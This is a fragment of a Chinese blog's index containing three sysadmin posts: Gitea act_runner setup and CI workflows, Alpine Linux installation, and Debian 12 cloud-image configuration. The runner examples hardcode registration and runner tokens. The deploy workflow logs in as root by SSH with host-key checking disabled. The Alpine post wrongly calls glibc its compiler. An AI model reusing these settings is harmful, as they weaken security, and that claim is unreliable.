class=\"line\"><span class=\"comment\"># 生成配置文件</span></span><br><span class=\"line\">./act_runner generate-config &gt; config.yml</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 注册runner</span></span><br><span class=\"line\">./act_runner register --no-interactive --instance &lt;instance_url&gt; --token &lt;registration_token&gt; --name &lt;runner_name&gt; --labels &lt;runner_labels&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 后台启动命令</span></span><br><span class=\"line\"> ./act_runner daemon -c config.yml </span><br></pre></td></tr></table></figure>\n\n<p>注册成功后，会在安装目录下有一个隐藏文件<code>.runner</code>，用于管理有效注册数据。</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;WARNING&quot;:</span> <span class=\"string\">&quot;This file is automatically generated by act-runner. Do not edit it manually unless you know what you are doing. Removing this file will cause act runner to re-register as a new runner.&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;id&quot;:</span> <span class=\"number\">5</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;uuid&quot;:</span> <span class=\"string\">&quot;b10307c2-7df3-46ca-88b7-6ffb06035a18&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;name&quot;:</span> <span class=\"string\">&quot;Runner&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;token&quot;:</span> <span class=\"string\">&quot;e4c2f662d3479e81ba40e7dba73911b6a073409e&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;address&quot;:</span> <span class=\"string\">&quot;http://gitea.lan&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;labels&quot;:</span> [</span><br><span class=\"line\">    <span class=\"string\">&quot;ubuntu-latest:docker://gitea/runner-images:ubuntu-latest&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ubuntu-22.04:docker://gitea/runner-images:ubuntu-22.04&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ubuntu-20.04:docker://gitea/runner-images:ubuntu-20.04&quot;</span></span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-docker-启动-act-runner\"><a href=\"#2-docker-启动-act-runner\" class=\"headerlink\" title=\"2. docker 启动 act runner\"></a>2. docker 启动 act runner</h3><h4 id=\"docker-compose-yml\"><a href=\"#docker-compose-yml\" class=\"headerlink\" title=\"docker-compose.yml\"></a>docker-compose.yml</h4><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&quot;3&quot;</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\">  <span class=\"attr\">runner:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">harbor.lan/gitea/act_runner:0.2.11</span></span><br><span class=\"line\">    <span class=\"attr\">environment:</span></span><br><span class=\"line\">      <span class=\"attr\">CONFIG_FILE:</span> <span class=\"string\">/config.yaml</span></span><br><span class=\"line\">      <span class=\"attr\">GITEA_INSTANCE_URL:</span> <span class=\"string\">&quot;http://gitea.lan&quot;</span></span><br><span class=\"line\">      <span class=\"attr\">GITEA_RUNNER_REGISTRATION_TOKEN:</span> <span class=\"string\">&quot;YRK2jnTuwJXYTMJCmsH13H0bf0IDp8T9EY86OSwx&quot;</span></span><br><span class=\"line\">      <span class=\"attr\">GITEA_RUNNER_NAME:</span> <span class=\"string\">&quot;Runner&quot;</span></span><br><span class=\"line\">      <span class=\"attr\">GITEA_RUNNER_LABELS:</span> <span class=\"string\">&quot;ubuntu-22.04&quot;</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./config.yaml:/config.yaml</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./data:/data</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/var/run/docker.sock:/var/run/docker.sock</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"config-yml\"><a href=\"#config-yml\" class=\"headerlink\" title=\"config.yml\"></a>config.yml</h4><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">log:</span></span><br><span class=\"line\">  <span class=\"attr\">level:</span> <span class=\"string\">info</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">runner:</span></span><br><span class=\"line\">  <span class=\"attr\">file:</span> <span class=\"string\">.runner</span>                                 <span class=\"comment\"># data/.runner 文件存储了 Gitea 注册的返回信息</span></span><br><span class=\"line\">  <span class=\"attr\">capacity:</span> <span class=\"number\">1</span>                                   <span class=\"comment\"># 同时允许 1 个实例运行</span></span><br><span class=\"line\">  <span class=\"attr\">envs:</span></span><br><span class=\"line\">    <span class=\"attr\">A_TEST_ENV_NAME_1:</span> <span class=\"string\">a_test_env_value_1</span></span><br><span class=\"line\">    <span class=\"attr\">A_TEST_ENV_NAME_2:</span> <span class=\"string\">a_test_env_value_2</span></span><br><span class=\"line\">  <span class=\"attr\">env_file:</span> <span class=\"string\">.env</span></span><br><span class=\"line\">  <span class=\"attr\">timeout:</span> <span class=\"string\">3h</span></span><br><span class=\"line\">  <span class=\"attr\">shutdown_timeout:</span> <span class=\"string\">0s</span></span><br><span class=\"line\">  <span class=\"attr\">insecure:</span> <span class=\"literal\">false</span>                               <span class=\"comment\"># 安全模式？</span></span><br><span class=\"line\">  <span class=\"attr\">fetch_timeout:</span> <span class=\"string\">5s</span></span><br><span class=\"line\">  <span class=\"attr\">fetch_interval:</span> <span class=\"string\">2s</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span>                                       <span class=\"comment\"># 默认从 github 拉取，改为本地镜像!!!</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">&quot;ubuntu-latest:docker://harbor.lan/proxy/gitea/runner-images:ubuntu-latest&quot;</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">&quot;ubuntu-22.04:docker://harbor.lan/proxy/gitea/runner-images:ubuntu-22.04&quot;</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">&quot;ubuntu-20.04:docker://harbor.lan/proxy/gitea/runner-images:ubuntu-20.04&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">cache:</span></span><br><span class=\"line\">  <span class=\"attr\">enabled:</span> <span class=\"literal\">true</span>                                 <span class=\"comment\"># 允许 cache server</span></span><br><span class=\"line\">  <span class=\"attr\">dir:</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">host:</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"attr\">external_server:</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">container:</span></span><br><span class=\"line\">  <span class=\"attr\">network:</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">privileged:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">  <span class=\"attr\">options:</span></span><br><span class=\"line\">  <span class=\"attr\">workdir_parent:</span></span><br><span class=\"line\">  <span class=\"attr\">valid_volumes:</span> []</span><br><span class=\"line\">  <span class=\"attr\">docker_host:</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">force_pull:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">force_rebuild:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">host:</span></span><br><span class=\"line\">  <span class=\"attr\">workdir_parent:</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-系统自启动\"><a href=\"#3-系统自启动\" class=\"headerlink\" title=\"3. 系统自启动\"></a>3. 系统自启动</h3><p>编辑<code>/etc/systemd/system/runner.service</code></p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Gitea Actions runner</span><br><span class=\"line\">Documentation=https://gitea.com/gitea/act_runner</span><br><span class=\"line\">After=docker.service</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\">Restart=on-failure</span><br><span class=\"line\">RestartSec=5</span><br><span class=\"line\">ExecStartPre=/usr/bin/docker-compose -f /opt/runner/docker-compose.yml down</span><br><span class=\"line\">ExecStart=/usr/bin/docker-compose -f /opt/runner/docker-compose.yml up</span><br><span class=\"line\">ExecStop=/usr/bin/docker-compose -f /opt/runner/docker-compose.yml down</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<p>workflow 的启动阶段，主要任务包括：</p>\n<ul>\n<li><code>docker pull gitea/runner-images:ubuntu-22.04</code>：获得基础镜像，并为当前任务启动容器</li>\n<li><code>git clone &#39;https://github.com/actions/setup-node</code>：下载当前任务需要的 Actions 脚本</li>\n<li>根据工作流语法，分析并替换所有表达式的变量名称</li>\n<li>创建工作目录 <code>/workspace</code>，为后续的代码下载和应用处理提供存储资源</li>\n</ul>\n<p>然后，就可以依次执行各个 step 的操作了。  </p>\n<h2 id=\"四、工作流配置\"><a href=\"#四、工作流配置\" class=\"headerlink\" title=\"四、工作流配置\"></a>四、工作流配置</h2><p>对于一个代码库，工作流配置文件保存在隐藏目录中，例如：<code>$REPO/.gitea/workflows/demo.yml</code></p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Gitea</span> <span class=\"string\">Actions</span> <span class=\"string\">Demo</span></span><br><span class=\"line\"><span class=\"attr\">run-name:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">gitea.actor</span> <span class=\"string\">&#125;&#125;</span> <span class=\"string\">is</span> <span class=\"string\">testing</span> <span class=\"string\">out</span> <span class=\"string\">Gitea</span> <span class=\"string\">Actions</span> <span class=\"string\">🚀</span></span><br><span class=\"line\"><span class=\"attr\">on:</span> [<span class=\"string\">push</span>]                          <span class=\"comment\"># 工作流的触发事件是 git push</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">Explore-Gitea-Actions:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-22.04</span>           <span class=\"comment\"># 查询 runner 中 label=ubuntu-22.04 的容器镜像 </span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">run:</span> <span class=\"string\">echo</span> <span class=\"string\">&quot;🎉 The job was automatically triggered by a $<span class=\"template-variable\">&#123;&#123; gitea.event_name &#125;&#125;</span> event.&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">run:</span> <span class=\"string\">echo</span> <span class=\"string\">&quot;🐧 This job is now running on a $<span class=\"template-variable\">&#123;&#123; runner.os &#125;&#125;</span> server hosted by Gitea!&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">run:</span> <span class=\"string\">echo</span> <span class=\"string\">&quot;🔎 The name of your branch is $<span class=\"template-variable\">&#123;&#123; gitea.ref &#125;&#125;</span> and your repository is $<span class=\"template-variable\">&#123;&#123; gitea.repository &#125;&#125;</span>.&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">out</span> <span class=\"string\">repository</span> <span class=\"string\">code</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v3</span>   <span class=\"comment\"># 调用预定义脚本 https://github.com/actions/checkout，版本3</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">run:</span> <span class=\"string\">echo</span> <span class=\"string\">&quot;💡 The $<span class=\"template-variable\">&#123;&#123; gitea.repository &#125;&#125;</span> repository has been cloned to the runner.&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">run:</span> <span class=\"string\">echo</span> <span class=\"string\">&quot;🖥️ The workflow is now ready to test your code on the runner.&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">List</span> <span class=\"string\">files</span> <span class=\"string\">in</span> <span class=\"string\">the</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span>                      <span class=\"comment\"># 执行 shell 命令</span></span><br><span class=\"line\">          <span class=\"string\">ls</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">gitea.workspace</span> <span class=\"string\">&#125;&#125;</span> <span class=\"comment\"># Gitea 提供 vars 和 secret 的数据存储</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">run:</span> <span class=\"string\">echo</span> <span class=\"string\">&quot;🍏 This job&#x27;s status is $<span class=\"template-variable\">&#123;&#123; job.status &#125;&#125;</span>.&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>Gitea 实例会自动检查 workflow 文件，当触发条件满足时，通知已注册的 Act Runner 执行工作流，并显示处理结果。<br>再给一个示例，其中 checkout、setup-node、ssh-agent 等预定义脚本已从 Github 镜像到本地 Gitea 代码库。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Deploy</span> <span class=\"string\">to</span> <span class=\"string\">Nginx</span></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">main</span>  <span class=\"comment\"># 根据实际情况修改分支名称</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">build-and-deploy:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-22.04</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span> <span class=\"string\">code</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">http://gitea.lan/actions/checkout@v3</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Set</span> <span class=\"string\">up</span> <span class=\"string\">Node.js</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">http://gitea.lan/actions/setup-node@v4</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"number\">20</span>  <span class=\"comment\"># 根据实际情况修改 Node.js 版本</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">dependencies</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">npm</span> <span class=\"string\">install</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Build</span> <span class=\"string\">project</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">npm</span> <span class=\"string\">run</span> <span class=\"string\">build</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Set</span> <span class=\"string\">up</span> <span class=\"string\">SSH</span> <span class=\"string\">key</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">http://gitea.lan/actions/ssh-agent@v0.5.4</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ssh-private-key:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.SSH_PRIVATE_KEY</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Deploy</span> <span class=\"string\">to</span> <span class=\"string\">Nginx</span> <span class=\"string\">server</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">          hostname</span></span><br><span class=\"line\"><span class=\"string\">          ssh -o StrictHostKeyChecking=no root@$&#123;&#123; vars.NGINX_IP_ADDRESS &#125;&#125; &quot;mkdir -p &quot; $&#123;&#123; vars.NGINX_ROOT_DIRECTORY &#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">          scp -r dist/* root@$&#123;&#123; vars.NGINX_IP_ADDRESS &#125;&#125;:$&#123;&#123; vars.NGINX_ROOT_DIRECTORY &#125;&#125;</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://docs.gitea.com/usage/actions/quickstart\">Gitea Actions 入门手册</a></li>\n<li><a href=\"https://docs.gitea.cn/usage/actions/quickstart\">Gitea Actions 入门手册 - 中文版</a></li>\n</ul>\n"},{"title":"Alpine Linux 安装记录","url":"/2025/02/16/Alpine-Linux-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>下载页面：<a href=\"https://www.alpinelinux.org/downloads/\">https://www.alpinelinux.org/downloads/</a></p>\n<ul>\n<li>Stanard：基础版本，安装需要网络支持</li>\n<li>Extended：最常用的版本，适合路由器和服务器。包含了常用软件包，仅支持 x86 架构</li>\n<li>Netboot：网络启动版本，适合 diskless 启动模式</li>\n<li>Rasperry PI：树莓派专用版本</li>\n<li>Mini Root Filesystem：最小化启动版本，适用于容器镜像</li>\n<li>Virtual：与基础版本类似，为虚拟机优化，系统内核较小</li>\n<li>Generic U-Boot：提供 LTS 内核，包含 U-Boot 启动器</li>\n<li>XEN：支持 XEN 虚拟化</li>\n</ul>\n<p>还有为云计算的定制版本：<a href=\"https://www.alpinelinux.org/cloud/\">https://www.alpinelinux.org/cloud/</a></p>\n<p>亚马逊定制的 AWS 是 <code>Release</code> 版本，宣称进行了充分测试。<br>微软 Azure、谷歌 GCP、甲骨文 OCI 的版本是 <code>Beta</code> 版，此外还有 NoCloud 的版本；<br>最新发布的 Alpine 版本还提供一个 Generic 版本，也就是 <code>Alpha</code> 版本。</p>\n<p>具体又分为几个规格，可以根据需要选择下载文件.</p>\n<ul>\n<li>CPU 架构：x86&#x2F;64 &amp; aarch64</li>\n<li>启动方式：BIOS &amp; UEFI</li>\n<li>预装软件：Cloud-init &amp; Tiny Cloud</li>\n<li>设备类型：虚拟机 Virtual &amp; 裸金属 Metal</li>\n</ul>\n<p>本文基准版本：<a href=\"https://dl-cdn.alpinelinux.org/alpine/v3.21/releases/cloud/nocloud_alpine-3.21.2-x86_64-bios-cloudinit-r0.qcow2\">nocloud_alpine-3.21.2-x86_64-bios-cloudinit-r0.qcow2</a></p>\n<ul>\n<li>没有 bash，而是采用 busybox 集成了几十个常用命令，参数和输出都很精简</li>\n<li>没有安装 sudo，临时使用可以用 doas 命令替代</li>\n<li>系统服务不是 systemd，而是传统的 rc.service</li>\n<li>软件源管理不是 apt 或 yum，而是自定义的 apk</li>\n<li>语言编译器不是 gcc，而是更简单的 glibc</li>\n</ul>\n<h2 id=\"二、定制步骤\"><a href=\"#二、定制步骤\" class=\"headerlink\" title=\"二、定制步骤\"></a>二、定制步骤</h2><p>基准版本已经预装 cloudinit，由于采用 qcow2 格式而非 ISO 格式，新建 VM 需在 PVE Console 通过 <code>qm importdisk</code> 加载。<br>正常启动后基础镜像仅有 200M 左右，默认用户是 alpine，密码在 cloudinit CDROM 设置。</p>\n<p>基线配置要点：</p>\n<ul>\n<li>默认 HD 约 200M，一般扩容 500M 即可</li>\n<li>激活 root 并设置 password</li>\n<li>安装常用工具：wget git net-tools bind-tools</li>\n<li>安装虚拟机软件：qemu-guest-agent，并激活服务和设置自启动</li>\n<li>设置时区：sudo apk add tzdata；sudo ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime</li>\n<li>SSH 配置: PermitRootLogin : false？</li>\n</ul>\n<h3 id=\"1-设置软件源\"><a href=\"#1-设置软件源\" class=\"headerlink\" title=\"1. 设置软件源\"></a>1. 设置软件源</h3><p>编辑 <code>/etc/apk/repositories</code></p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#/media/cdrom/apks</span></span><br><span class=\"line\"><span class=\"string\">http://mirrors.aliyun.com/alpine/v3.20/main</span></span><br><span class=\"line\"><span class=\"comment\">#http://mirrors.aliyun.com/alpine/v3.20/community</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-常用指令\"><a href=\"#2-常用指令\" class=\"headerlink\" title=\"2. 常用指令\"></a>2. 常用指令</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">poweroff                                <span class=\"comment\"># 关机指令，替代 shutdown now</span></span><br><span class=\"line\"></span><br><span class=\"line\">apk update                              <span class=\"comment\"># 更新软件源索引</span></span><br><span class=\"line\">apk add qemu-guest-agent                <span class=\"comment\"># 安装软件包</span></span><br><span class=\"line\"></span><br><span class=\"line\">rc-service qemu-guest-agent start       <span class=\"comment\"># 系统服务启动软件包，start｜stop｜restart｜status</span></span><br><span class=\"line\">rc-update add qemu-guest-agent boot     <span class=\"comment\"># 设置系统自启动服务</span></span><br><span class=\"line\">rc-status                               <span class=\"comment\"># 列出运行级的状态管理。</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"附录一：ISO-安装方式\"><a href=\"#附录一：ISO-安装方式\" class=\"headerlink\" title=\"附录一：ISO 安装方式\"></a>附录一：ISO 安装方式</h2><p>CDROM 安装启动是在 RAM 进行的，所以速度特别快，但<strong>无法存储系统配置</strong>，登录后提示使用 <code>setup-alpine</code> 进行安装。</p>\n<ul>\n<li>Keymap：us us</li>\n<li>Hostname：默认 localhost</li>\n<li>Interface：默认 DHCP</li>\n<li>Root Password：******</li>\n<li>Timezone：PRC</li>\n<li>Proxy：默认 none</li>\n<li>APK Mirror：清华源 14，阿里云 49</li>\n<li>User：默认，无普通用户；默认不允许 Root 登录；使用 sshd 软件包</li>\n<li>Disk &amp; Install：选择 sda；模式选择 lvmsys，即 LVM 管理的 system 盘</li>\n</ul>\n<p>格式化硬盘后，提示安装完成，可以 reboot 了。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.techtutorials.tv/sections/promox/proxmox-alpine-cloud-init-image/\">PVE 安装 Alpine + Cloud-init</a></li>\n<li><a href=\"https://www.cnblogs.com/smlile-you-me/p/17321107.html\">Alpine Linux 安装</a></li>\n<li><a href=\"https://www.cnblogs.com/sunsky303/p/11548343.html\">ALpine 踩坑指南</a></li>\n</ul>\n<h2 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h2><ul>\n<li><a href=\"https://wiki.alpinelinux.org/wiki/Installation#\">Alpine 安装手册</a></li>\n</ul>\n"},{"title":"Debian12 Cloud 安装记录","url":"/2025/03/01/Debian12-Cloud-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<p>Debian 的每个版本都有绰号，都来自于电影《玩具总动员》中的角色名。</p>\n<ul>\n<li>Debian 8：Jessie，一个乐于助人，热心而温柔的女牛仔</li>\n<li>Debian 9：Stretch，紫色的大章鱼</li>\n<li>Debian 10：Buster：臭小子，安迪一家养的小狗</li>\n<li>Debian 11：Bullseye，红心，风驰电掣的玩具马</li>\n<li>Debian 12：bookworm，书虫，手持强力手电筒，帮助你阅读</li>\n</ul>\n<p>随着云计算的普及，在传统 ISO 镜像安装方式的基础上，Debian 还提供了 Cloud 版本的官方支持，请参见<a href=\"https://cloud.debian.org/images/cloud/\">https://cloud.debian.org/images/cloud/</a> ，子版本有以下类型：</p>\n<ul>\n<li>azure: 基于 Microsoft Azure 环境优化</li>\n<li>ec2: 基于 Amazon EC2 环境优化</li>\n<li>generic: 基于 OpenStack 环境，预装 cloud-init，也可以用于裸金属服务器</li>\n<li>genericcloud: 与 generic 相似，系统更精简，但不支持额外硬件设备</li>\n<li>nocloud: 单机版本，不提供 cloud-init，默认无密码的 root 用户</li>\n</ul>\n<p>本次安装使用最新的 Debian 12 generic-cloud 版本，64位x86 架构，2025年2月10日发布。<br>镜像下载地址：<a href=\"https://cloud.debian.org/images/cloud/bookworm/20250210-2019/debian-12-genericcloud-amd64-20250210-2019.qcow2\">debian-12-genericcloud-amd64-20250210-2019.qcow2</a><br>预装软件信息：<a href=\"https://cloud.debian.org/images/cloud/bookworm/20250210-2019/debian-12-genericcloud-amd64-20250210-2019.json\">debian-12-genericcloud-amd64-20250210-2019.json</a></p>\n<p>在 PVE console 导入 qcow2 镜像，初始磁盘空间为 3GB。</p>\n<blockquote>\n<p>为了替换无比丑陋的 NoVNC，VM 硬件添加 serial port 以支持 xterm.js</p>\n</blockquote>\n<p>配置 cloud-init，<strong>默认用户 debian 和初始密码</strong>，取消软件自动升级参数等。。。</p>\n<h2 id=\"一、设置国内镜像源\"><a href=\"#一、设置国内镜像源\" class=\"headerlink\" title=\"一、设置国内镜像源\"></a>一、设置国内镜像源</h2><p>系统源配置文件不再是传统的 <code>/etc/apt/sources.list</code>，而是改为 Deb 822 格式。<br>配置文件：<code>/etc/apt/sources.list.d/debian.sources</code></p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">Types:</span> <span class=\"string\">deb</span> <span class=\"string\">deb-src</span></span><br><span class=\"line\"><span class=\"attr\">URIs:</span> <span class=\"string\">https://mirrors.aliyun.com/debian</span>             <span class=\"comment\"># mirror+file:///etc/apt/mirrors/debian.list </span></span><br><span class=\"line\"><span class=\"attr\">Suites:</span> <span class=\"string\">bookworm</span> <span class=\"string\">bookworm-updates</span> <span class=\"string\">bookworm-backports</span></span><br><span class=\"line\"><span class=\"attr\">Components:</span> <span class=\"string\">main</span></span><br><span class=\"line\"><span class=\"attr\">Signed-By:</span> <span class=\"string\">/usr/share/keyrings/debian-archive-keyring.gpg</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">Types:</span> <span class=\"string\">deb</span> <span class=\"string\">deb-src</span></span><br><span class=\"line\"><span class=\"attr\">URIs:</span> <span class=\"string\">https://mirrors.aliyun.com/debian-security</span>    <span class=\"comment\"># mirror+file:///etc/apt/mirrors/debian-security.list</span></span><br><span class=\"line\"><span class=\"attr\">Suites:</span> <span class=\"string\">bookworm-security</span></span><br><span class=\"line\"><span class=\"attr\">Components:</span> <span class=\"string\">main</span></span><br><span class=\"line\"><span class=\"attr\">Signed-By:</span> <span class=\"string\">/usr/share/keyrings/debian-archive-keyring.gpg</span></span><br></pre></td></tr></table></figure>\n\n<p>如果需要使用非自由固件，则在编辑配置时需要添加 <code>non-free-firmware</code>。</p>\n<h2 id=\"二、安装常用软件\"><a href=\"#二、安装常用软件\" class=\"headerlink\" title=\"二、安装常用软件\"></a>二、安装常用软件</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt update</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置时区</span></span><br><span class=\"line\">timedatectl set-timezone Asia/Shanghai</span><br><span class=\"line\"><span class=\"built_in\">date</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装常用软件</span></span><br><span class=\"line\">apt install -y git wget net-tools bind9-dnsutils</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装 qemu 相关软件</span></span><br><span class=\"line\">apt install -y qemu-guest-agent acpid </span><br><span class=\"line\">systemctl start qemu-guest-agent</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关闭-ipv6\"><a href=\"#关闭-ipv6\" class=\"headerlink\" title=\"关闭 ipv6\"></a>关闭 ipv6</h3><p>编辑 <code>/etc/sysctl.conf</code>，追加以下配置信息：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">net.ipv6.conf.all.disable_ipv6 = 1</span><br><span class=\"line\">net.ipv6.conf.default.disable_ipv6 = 1</span><br><span class=\"line\">net.ipv6.conf.lo.disable_ipv6 = 1</span><br><span class=\"line\">net.ipv6.conf.eth0.disable_ipv6 = 1</span><br></pre></td></tr></table></figure>\n\n<p>执行下面命令，以使配置生效：<br><code>sysctl -p</code></p>\n<p>现在基础安装完成！大约需要 400M 磁盘空间。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class=\"line\">udev            462M     0  462M   0% /dev</span><br><span class=\"line\">tmpfs            97M  568K   96M   1% /run</span><br><span class=\"line\">/dev/sda1       2.8G  1.2G  1.5G  46% /</span><br><span class=\"line\">tmpfs           481M     0  481M   0% /dev/shm</span><br><span class=\"line\">tmpfs           5.0M     0  5.0M   0% /run/lock</span><br><span 